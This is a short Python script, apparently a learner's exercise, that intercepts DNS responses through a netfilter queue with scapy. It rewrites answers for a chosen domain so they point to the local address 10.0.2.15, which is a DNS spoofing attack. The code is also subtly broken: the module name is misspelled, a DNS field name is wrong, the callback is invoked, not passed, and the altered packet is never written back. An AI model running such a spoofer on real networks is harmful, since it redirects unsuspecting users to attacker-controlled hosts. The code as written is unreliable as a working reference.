#!/usr/bin/env python

import netfilterqueve
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.freeversions.ru" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdate="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1


            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            



    packet.accept()


queue = netfilterqueve.NetfilterQueve()
queue.bind(0, process_packet())
queue.run()
